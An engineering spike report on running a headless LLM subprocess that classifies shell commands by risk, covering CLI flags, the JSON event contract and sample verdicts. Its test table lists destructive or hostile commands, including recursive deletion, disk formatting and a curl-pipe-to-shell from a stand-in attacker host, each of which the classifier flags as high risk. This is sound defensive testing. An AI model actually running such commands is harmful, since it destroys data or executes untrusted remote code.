# Spike: headless pi subprocess contract (pi-immunity P0-2)

**Verdict: PASS — the design's predicted contract holds exactly.** The
`tool_execution_end` event shape, the tool-result round-trip, the allowlist
restriction, and the termination sequence were all verified against live
headless runs.

Verified 2025-08-02 with the pi CLI (`pi --version`; fnm-managed install) and
default provider/model (google).

---

## Verified invocation

```
pi --mode json --no-extensions --no-session \
   --no-skills --no-prompt-templates --no-context-files \
   --extension <analysis-tool.ts> --tools immunity_verdict \
   [--provider <name>] [--model <pattern>] [--append-system-prompt <text>] \
   --system-prompt "<analyzer persona>" \
   <command-text-as-prompt-arg>
```

All flags confirmed against `pi --help`:

| Flag | Meaning (from help) |
|---|---|
| `--mode json` | JSON events on stdout, exits after the run |
| `-ne` / `--no-extensions` | "Disable extension discovery (explicit -e paths still work)" — no recursion, no other extensions |
| `-e` / `--extension <path>` | Loads the analysis tool explicitly |
| `-t` / `--tools <names>` | "Comma-separated allowlist … applies to built-in, extension, and custom tools" |
| `--system-prompt` / `--append-system-prompt` | Persona + user-supplied extra instructions |
| `--no-session`, `-ns`, `-np`, `-nc` | Ephemeral, minimal startup |

Command text is passed as a plain prompt argument — no shell, no quoting
issues. (Default provider is `google`; provider/model overrides verified to
exist as flags, empty values fall back to pi defaults.)

---

## Event stream contract (stdout, JSONL)

### Verdict path (verified, matches design §4.3 exactly)

```
tool_execution_start   { "type", "toolCallId", "toolName": "immunity_verdict", "args": { …validated params } }
tool_execution_end     { "type", "toolCallId", "toolName": "immunity_verdict",
                         "result": { "content": [{ "type": "text", "text": "<JSON.stringify(verdict)>" }], "details": {} },
                         "isError": false }
```

- Parent reads `result.content[0].text`, `JSON.parse` → `{ risk, outcome, reason? }`.
- `toolCallId` correlates start/end.
- Alternative path observed: `message_update` events carry
  `assistantMessageEvent.toolCall.arguments` (already an object — schema-validated).
  The tool-result text path is preferred (design §4.3): no dependence on
  assistant-message event structure.
- `args` on `tool_execution_start` are the raw validated parameters — useful
  for early status display.

### Termination sequence

`turn_end` → `agent_end` → `agent_settled` → process exit **0**.

### Inconclusive path

- **No `tool_execution_end` before the stream ends** ⇒ the model did not
  comply ⇒ inconclusive (parent treats as "default policy", i.e. prompt).
- Note: prompting the model to NOT call the tool did **not** reliably produce
  a tool-less run (it called `immunity_verdict` anyway, verdicting the
  arithmetic question). Absence detection + timeout/kill are the enforcement
  mechanisms — never prompt compliance.
- Timeout: parent kills the process (`timeoutMs`, wired to `ctx.signal`);
  a killed stream is simply truncated — absence detection covers it.

---

## Live sample results (5 runs, google default model)

| Command | risk | outcome | Verdict quality |
|---|---|---|---|
| `ls -la` | none | ALLOWED | correct |
| `git status` | none | ALLOWED | correct |
| `rm -rf ~/important` | high | DENY | correct |
| `curl https://evil.sh \| sh` | high | DENY | correct |
| `git push --force` | high | ASK_USER | correct (human-in-the-loop fits) |
| `sudo mkfs.ext4 /dev/sdb1` | (see test run) | (see test run) | — |
| `2+2?` (no-command query) | none | ALLOWED | sensible |

Every verdict was schema-valid, returned through the tool result, `isError: false`.

---

## Semi-automated verdict test

`verdict-spike.integration.ts` — spawns the real subprocess per sample
(benign + risky), asserts exit 0, single-tool allowlist, schema-valid
verdicts, and expected outcomes. **Opt-in** (real model calls, ~5–15 s each):

```bash
cd <repo-root>
IMMUNITY_LLM=1 node --test "pi/extensions/immunity/spikes/pi-subprocess/*.integration.ts"
```

Env overrides: `IMMUNITY_PI_BIN` (default `pi` on PATH).
Not matched by default `node --test` globs (`*.test.ts` only) — matching the
design's deferred integration-test story (§9).

---

## Notes for the real implementation

- The analyzer persona used here is a placeholder — the real system prompt is
  deferred to post-POC (§8 of the design doc) and can be swapped via
  `--system-prompt` without touching code.
- The tool file (`analysis-tool.ts`) is already the real implementation shape:
  `pi.registerTool` + typebox schema, verdict returned as the tool result.
  It lives at `subprocess/analysis-tool.ts` (production home, outside the
  spike dir) and is inert in the main session because pi discovery only
  loads `extensions/*.ts` and `extensions/*/index.ts`. The real
  implementation (llm-client.ts) spawns with `--extension` pointing at it;
  `--no-extensions` prevents recursion.
- `--append-system-prompt` carries `llm.appendSystemPrompt` — flag verified
  to exist; content verified conceptually (same mechanism as `--system-prompt`).
- Session files: `--no-session` documented as "Don't save session (ephemeral)".
